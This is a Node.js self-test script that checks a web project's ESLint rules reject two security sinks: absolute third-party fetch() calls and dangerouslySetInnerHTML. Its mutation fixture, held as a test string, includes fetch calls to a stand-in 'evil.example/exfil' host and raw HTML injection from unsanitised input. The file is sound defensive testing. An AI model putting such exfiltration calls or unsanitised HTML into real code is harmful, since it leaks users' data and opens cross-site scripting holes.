#!/usr/bin/env node
// SPDX-License-Identifier: BUSL-1.1
//
// Use of this source code is governed by the Business Source License 1.1
// in the LICENSE file at the root of this repository; on its Change Date
// each version converts to the Mozilla Public License 2.0.

// WEB-27 self-test gate: proves the web lint rules actually REJECT the two
// security sinks they claim to — an absolute third-party fetch() and a
// dangerouslySetInnerHTML prop — by linting a clean fixture (expect no errors)
// and a mutation fixture (expect one error per sink). It uses the EXACT
// selectors the real lint config loads (web/eslint.restrictions.js), so a
// future edit that weakens the rule fails here, not only silently in CI.
//
// Run: node scripts/check_web_no_danger.mjs   (no flags; always self-tests)

import { createRequire } from "node:module";
import { restrictedSyntax } from "../web/eslint.restrictions.js";

// eslint is a dependency of the web workspace, not the repo root, so resolve it
// from web/ regardless of the caller's cwd.
const require = createRequire(new URL("../web/package.json", import.meta.url));
const { Linter } = require("eslint");

const linter = new Linter({ configType: "flat" });
const config = [
  {
    files: ["**/*.jsx"],
    languageOptions: {
      ecmaVersion: "latest",
      sourceType: "module",
      parserOptions: { ecmaFeatures: { jsx: true } },
    },
    rules: { "no-restricted-syntax": ["error", ...restrictedSyntax] },
  },
];

// Clean fixture: every pattern the real app uses that must stay legal —
// relative apiFetch/publicFetch, a variable fetch target, a relative literal,
// and a generated code-sample string that merely CONTAINS an absolute URL.
const clean = `
function sample(url) {
  apiFetch('/me')
  apiFetch(\`/incidents/\${id}\`)
  publicFetch('/openapi.json')
  fetch(apiURL('/targets'))
  fetch(path)
  fetch('/openapi.json')
  const snippet = \`await fetch('\${url}', { method: 'GET' })\`
  return <div title={snippet}>{snippet}</div>
}
`;

// Mutation fixture: one occurrence of each banned sink.
const mutation = `
function evil(x) {
  fetch('https://evil.example/exfil')
  fetch(\`https://evil.example/\${x}\`)
  return <div dangerouslySetInnerHTML={{ __html: x }} />
}
`;

function lint(code) {
  return linter.verify(code, config, { filename: "fixture.jsx" });
}

const failures = [];

const cleanMsgs = lint(clean);
if (cleanMsgs.length !== 0) {
  failures.push(
    `clean fixture should produce 0 errors, got ${cleanMsgs.length}:\n` +
      cleanMsgs.map((m) => `  L${m.line}: ${m.message}`).join("\n"),
  );
}

const mutationMsgs = lint(mutation);
if (mutationMsgs.length < 3) {
  failures.push(
    `mutation fixture should be caught (>=3 errors), got ${mutationMsgs.length}:\n` +
      mutationMsgs.map((m) => `  L${m.line}: ${m.message}`).join("\n"),
  );
} else {
  const joined = mutationMsgs.map((m) => m.message).join("\n");
  const dangerous = mutationMsgs.filter((m) =>
    /dangerouslySetInnerHTML is banned/.test(m.message),
  );
  const absolute = mutationMsgs.filter((m) =>
    /absolute http\(s\):\/\/ URL/.test(m.message),
  );
  if (dangerous.length < 1)
    failures.push(`dangerouslySetInnerHTML not caught:\n${joined}`);
  if (absolute.length < 2)
    failures.push(
      `absolute fetch (literal + template) not both caught:\n${joined}`,
    );
}

if (failures.length > 0) {
  console.error("web no-danger gate FAILED (WEB-27):");
  for (const f of failures) console.error("- " + f);
  process.exit(1);
}

console.log(
  "web no-danger gate: OK (absolute fetch + dangerouslySetInnerHTML rejected; app patterns pass) (WEB-27)",
);
